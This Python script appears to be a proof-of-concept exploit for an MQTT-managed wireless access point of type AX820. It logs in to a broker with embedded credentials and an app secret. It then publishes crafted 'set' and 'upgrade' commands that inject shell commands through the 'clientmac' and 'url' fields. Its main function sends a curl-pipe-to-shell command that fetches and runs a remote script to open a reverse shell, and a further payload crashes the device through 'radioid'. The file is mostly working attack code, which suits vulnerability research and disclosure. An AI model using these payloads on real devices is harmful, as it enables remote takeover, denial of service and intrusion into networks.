"""
MQTT Broker:
    - connects to our broker
    - suscribes to /<prtid>/<cltid>/dev2app topic
    - public to /<prtid>/<cltid>/app2dev topic: execute command on the AP
"""

import configparser
import datetime
import json
from typing import Any

import paho.mqtt.client as mqtt
from paho.mqtt.client import Client, MQTTMessage
from paho.mqtt.properties import Properties
from paho.mqtt.reasoncodes import ReasonCode

config = configparser.ConfigParser()
config.read("configuration.ini")

WEB_SERVER_IP = config["WEB_SERVER"].get("IP", "192.168.188.180")
WEB_SERVER_PORT = config["WEB_SERVER"].getint("PORT", 8080)

MQTT_BROKER_IP = config["MQTT_BROKER"].get("IP", "192.168.188.180")
MQTT_BROKER_PORT = config["MQTT_BROKER"].getint("PORT", 1883)
MQTT_BROKER_USERNAME = config["MQTT_BROKER"].get("USERNAME", "yuncorelot")
MQTT_BROKER_PASSWORD = config["MQTT_BROKER"].get("PASSWORD", "eufhja*@2756_hja")

AP_PRTID = config["AP"].get("PRTID", "prtdaxkypywtbwvarlgepmqvr")


body = {
    "appid": "325986ac102df6261ca5fbfbc2aa3458",
    "secret": "fbcb84MxLNDndnWCWZ08TXIj9ePbBp8lHVp9rBXy",
    "prtid": AP_PRTID,
    "mac": "7C:27:3C:00:94:45",
    "type": "AX820",
}


# Messages published


def set_log_status(client: Client, enable: bool):
    """Enable or disable logs (for testing)

    Args:
        client (Client): mqtt client
        enable (bool): whether to start (True) or stop logs
    """
    log_value = 1 if enable else 0
    payload = json.dumps(
        {
            "now": str(int(datetime.datetime.now().timestamp())),
            "body": {
                "command": {
                    "type": "set",
                    "bind": "thisIsABindCode",
                    "log": log_value,
                }
            },
        }
    )
    client.publish(
        f"{AP_PRTID}/somecltid/app2dev",
        payload,
    )


def set_rce(client: Client, command: str):
    """Use the 'set' command and exploit the injection in the 'clientmac' parameter

    Args:
        client (Client): mqtt client
        command (str): the command the be executed, its size is limited so I do reverse shell
    """
    payload = json.dumps(
        {
            "now": str(int(datetime.datetime.now().timestamp())),
            "body": {
                "command": {
                    "type": "set",
                    "auth": [
                        {
                            "radioid": "",
                            "status": "0",
                            "clientmac": f";{command};",  # rce is here !
                        }
                    ],
                }
            },
        }
    )

    print(payload)

    client.publish(
        f"{AP_PRTID}/somecltid/app2dev",
        payload,
    )


def upgrade_rce(client: Client, command: str):
    """Use the 'upgrade' command and exploit the injection in the 'url' parameter

    Args:
        client (Client): mqtt client
        command (str): the command the be executed, its size is limited so I do reverse shell
    """
    payload = json.dumps(
        {
            "now": str(int(datetime.datetime.now().timestamp())),
            "body": {
                "command": {
                    "type": "upgrade",
                    "url": f";{command};",  # rce is here !,
                    "signature": "abcd",
                    "wait": "1",
                    "orderid": "abcd",
                }
            },
        }
    )

    print(payload)

    client.publish(
        f"{AP_PRTID}/somecltid/app2dev",
        payload,
    )


# DoS


def do_dos_in_radioid(client: Client):
    """Trigger a crash via radioid parameter

    Args:
        client (Client): mqtt client
    """
    payload = json.dumps(
        {
            "now": str(int(datetime.datetime.now().timestamp())),
            "body": {
                "command": {
                    "type": "set",
                    "auth": [
                        {
                            "radioid": "A",
                        }
                    ],
                }
            },
        }
    )
    print(payload)
    client.publish(
        f"{AP_PRTID}/somecltid/app2dev",
        payload,
    )


# MQTT specific callbacks


def on_subscribe(
    client: Client,
    userdata: Any,
    mid: int,
    reason_code_list: list[ReasonCode],
    properties: Properties,
):
    """Suscribe callback"""

    # Since we subscribed only for a single channel, reason_code_list contains
    # a single entry
    if reason_code_list[0].is_failure:
        print(f"Broker rejected you subscription: {reason_code_list[0]}")
    else:
        print(f"Broker granted the following QoS: {reason_code_list[0].value}")


def on_connect(
    client: Client,
    userdata: Any,
    connect_flags: dict[str, str],
    reason_code: int,
    properties: Properties,
):
    """Connect callback"""

    print(f"Connected with result code {reason_code}")
    client.subscribe(f"{AP_PRTID}/+/#")


def on_message(client: Client, userdata: Any, msg: MQTTMessage):
    """Message callback"""
    print(f"{msg.topic} - {msg.payload}")


def main():
    """main"""
    # get_client()
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)  # type: ignore
    client.on_connect = on_connect  # type: ignore
    client.on_message = on_message
    client.on_subscribe = on_subscribe

    client.username_pw_set(
        MQTT_BROKER_USERNAME,
        MQTT_BROKER_PASSWORD,
    )
    client.connect(MQTT_BROKER_IP, MQTT_BROKER_PORT, 60)

    # ============
    # Change here!
    # ============

    # set_rce(client, f"curl {WEB_SERVER_IP}:{WEB_SERVER_PORT}/sh|sh")
    upgrade_rce(client, f"curl {WEB_SERVER_IP}:{WEB_SERVER_PORT}/sh|sh")
    # do_dos_in_radioid(client)

    client.loop_forever()


if __name__ == "__main__":
    main()
